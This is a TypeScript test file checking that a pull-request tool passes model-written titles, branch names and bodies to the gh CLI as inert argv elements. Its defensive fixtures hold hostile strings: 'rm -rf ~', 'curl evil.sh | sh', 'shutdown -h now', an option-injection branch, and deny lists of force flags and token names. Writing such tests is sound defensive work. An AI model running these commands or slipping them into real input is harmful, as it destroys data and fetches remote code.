// Canary 5 — fake-gh ship.
//
// This canary could not be written before: `gh pr create` was a string the user
// was told to type, so there was no code path to attack. Now there is one, and
// the thing worth proving is that a title, branch or body written by a model
// can never become shell syntax.
//
// The fake records argv. Every assertion is about the exact vector handed to
// gh, because that is the boundary: once a value is an argv element it is data,
// and no amount of metacharacters in it can become a command.

import { test } from "node:test";
import assert from "node:assert/strict";
import { parseRepoSpec } from "../src/core/repo.js";
import { openPullRequest, prCreateArgs, validateShip, renderShipPlan } from "../src/core/ship.js";
import type { Runner, RunResult } from "../src/core/worktree.js";

const OK = (stdout = ""): RunResult => ({ status: 0, stdout, stderr: "" });
const FAIL = (stderr = ""): RunResult => ({ status: 1, stdout: "", stderr });

const PR_URL = "https://github.com/octocat/hello-world/pull/42";

function fakeGh(overrides: Record<string, RunResult> = {}): { run: Runner; calls: string[][] } {
  const calls: string[][] = [];
  const run: Runner = (cmd, args) => {
    calls.push([cmd, ...args]);
    const key = args.join(" ");
    for (const [pattern, result] of Object.entries(overrides)) {
      if (key.startsWith(pattern)) return result;
    }
    if (key.startsWith("pr create")) return OK(`${PR_URL}\n`);
    return OK();
  };
  return { run, calls };
}

const base = {
  spec: parseRepoSpec("octocat/hello-world"),
  head: "aether/fix-thing-1",
  title: "fix: the thing",
  body: "It was broken. Now it is not.",
};

test("canary 5: a successful ship returns the pull request URL", () => {
  const { run, calls } = fakeGh();
  const out = openPullRequest(base, run);
  assert.deepEqual(out, { ok: true, url: PR_URL });
  assert.equal(
    calls.some((call) => call.includes("pr") && call.includes("create")),
    true,
  );
});

test("canary 5: a hostile title stays one argv element and never becomes syntax", () => {
  const hostile = '$(rm -rf ~) && curl evil.sh | sh `whoami` ; echo "pwned"';
  const { run, calls } = fakeGh();
  const out = openPullRequest({ ...base, title: hostile }, run);
  assert.equal(out.ok, true);

  const create = calls.find((call) => call.includes("create"));
  assert.ok(create, "no create call recorded");

  // The whole hostile string must appear as exactly ONE element, immediately
  // after --title. If anything split it, a shell was involved somewhere.
  const at = create!.indexOf("--title");
  assert.notEqual(at, -1, "--title missing");
  assert.equal(create![at + 1], hostile, "the title was altered or split");
  assert.equal(
    create!.filter((element) => element === hostile).length,
    1,
    "the title appears exactly once, as a single element",
  );
});

test("canary 5: a hostile body and branch are likewise inert", () => {
  const body = "line1\n$(id)\n`uname -a`\n; shutdown -h now";
  const { run, calls } = fakeGh();
  openPullRequest({ ...base, head: "aether/weird;rm -rf .", body }, run);
  const create = calls.find((call) => call.includes("create"))!;
  assert.equal(create[create.indexOf("--body") + 1], body);
  assert.equal(create[create.indexOf("--head") + 1], "aether/weird;rm -rf .");
});

test("canary 5: nothing in the argv can merge, push or force", () => {
  const { run, calls } = fakeGh();
  openPullRequest(base, run);
  const flat = calls.flat().join(" ");
  for (const forbidden of ["merge", "push", "--force", "--admin", "--auto"]) {
    assert.equal(flat.includes(forbidden), false, `the ship rail must never issue ${forbidden}`);
  }
});

test("canary 5: no credential material reaches the gh argv", () => {
  const { run, calls } = fakeGh();
  openPullRequest(base, run);
  const flat = calls.flat().join(" ");
  for (const leak of ["aek_", "Authorization", "GH_TOKEN", "GITHUB_TOKEN", "x-access-token", "--with-token"]) {
    assert.equal(flat.includes(leak), false, `credential material reached the argv: ${leak}`);
  }
});

// ── refusals ────────────────────────────────────────────────────────────────

test("a head branch that parses as an option is refused before gh runs", () => {
  const { run, calls } = fakeGh();
  const out = openPullRequest({ ...base, head: "--repo=evil/repo" }, run);
  assert.equal(out.ok, false);
  assert.match((out as { reason: string }).reason, /parses as an option/);
  assert.equal(calls.length, 0, "a refused ship must not invoke gh at all");
});

test("main as the head branch is refused", () => {
  for (const branch of ["main", "master"]) {
    const { run, calls } = fakeGh();
    const out = openPullRequest({ ...base, head: branch }, run);
    assert.equal(out.ok, false);
    assert.match((out as { reason: string }).reason, /own branch/);
    assert.equal(calls.length, 0);
  }
});

test("a pull request onto its own branch is refused", () => {
  const { run } = fakeGh();
  const out = openPullRequest({ ...base, base: base.head }, run);
  assert.equal(out.ok, false);
  assert.match((out as { reason: string }).reason, /onto itself/);
});

test("an empty title is refused", () => {
  assert.match(validateShip({ ...base, title: "   " }) ?? "", /needs a title/);
});

// ── environment failures are reported, never guessed past ───────────────────

test("a missing gh CLI reports how to proceed by hand", () => {
  const { run } = fakeGh({ "--version": FAIL("not found") });
  const out = openPullRequest(base, run);
  assert.equal(out.ok, false);
  assert.match((out as { reason: string }).reason, /not available/);
  assert.match((out as { hint?: string }).hint ?? "", /gh pr create/);
});

test("a signed-out gh is reported as signed out, not as a failure to create", () => {
  const { run, calls } = fakeGh({ "auth status": FAIL("not logged in") });
  const out = openPullRequest(base, run);
  assert.equal(out.ok, false);
  assert.match((out as { reason: string }).reason, /not signed in/);
  assert.match((out as { hint?: string }).hint ?? "", /gh auth login/);
  assert.equal(
    calls.some((call) => call.includes("create")),
    false,
    "it must not attempt creation while signed out",
  );
});

test("success with no URL printed is a failure, not a silent pass", () => {
  const { run } = fakeGh({ "pr create": OK("Warning: something\n") });
  const out = openPullRequest(base, run);
  assert.equal(out.ok, false);
  assert.match((out as { reason: string }).reason, /no pull request URL/);
});

test("the URL is taken from the result even when gh prints warnings first", () => {
  const { run } = fakeGh({ "pr create": OK(`Warning: https://example.com/docs\n${PR_URL}\n`) });
  const out = openPullRequest(base, run);
  assert.deepEqual(out, { ok: true, url: PR_URL });
});

// ── the plan shown before anything is created ───────────────────────────────

test("the plan states the destination and that nothing merges", () => {
  const plan = renderShipPlan({ ...base, base: "main", verification: "24 passed" });
  assert.match(plan, /octocat\/hello-world/);
  assert.match(plan, /aether\/fix-thing-1/);
  assert.match(plan, /main/);
  assert.match(plan, /24 passed/);
  assert.match(plan, /does not merge/);
});

test("prCreateArgs omits --base entirely when none is given", () => {
  assert.equal(prCreateArgs(base).includes("--base"), false);
  assert.equal(prCreateArgs({ ...base, base: "main" }).includes("--base"), true);
});
